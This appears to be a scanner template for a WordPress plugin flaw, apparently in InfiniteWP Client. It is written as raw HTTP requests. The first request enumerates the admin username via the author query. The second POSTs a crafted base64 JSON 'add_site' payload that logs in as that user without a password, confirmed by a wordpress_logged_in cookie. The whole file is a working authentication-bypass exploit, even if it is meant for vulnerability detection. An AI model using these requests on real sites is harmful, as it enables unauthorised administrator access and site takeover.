http:
- extractors:
  - group: 1
    internal: true
    name: username
    part: body
    regex:
    - Author:(?:[A-Za-z0-9 -\_="]+)?<span(?:[A-Za-z0-9 -\_="]+)?>([A-Za-z0-9]+)<\/span>
    type: regex
  - group: 1
    internal: true
    name: username
    part: header
    regex:
    - 'ion: https:\/\/[a-z0-9.]+\/author\/([a-z]+)\/'
    type: regex
  matchers:
  - part: header
    type: word
    words:
    - wordpress_logged_in
  - part: body
    type: word
    words:
    - <IWPHEADER>
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /?author=1 HTTP/1.1

    Host: {{Hostname}}

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

    Accept-Language: en-US,en;q=0.9

    '
  - "POST / HTTP/1.1\nHost: {{Hostname}}\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n\
    Content-Type: application/x-www-form-urlencoded\n\n_IWP_JSON_PREFIX_{{base64(\"\
    {\\\"iwp_action\\\":\\\"add_site\\\",\\\"params\\\":{\\\"username\\\":\\\"\xA7\
    username\xA7\\\"}}\")}}\n"
  redirects: true
